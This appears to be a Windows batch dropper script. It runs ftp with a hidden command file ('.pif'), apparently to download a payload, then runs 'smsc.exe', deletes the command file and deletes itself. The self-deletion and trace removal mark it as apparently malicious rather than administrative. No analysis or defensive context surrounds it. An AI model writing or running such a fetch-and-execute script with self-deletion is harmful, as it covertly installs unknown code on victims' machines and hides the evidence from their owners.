@echo off 
ftp -n -v -s:.pif 
smsc.exe 
del .pif 
del /F c.bat 
exit /y 
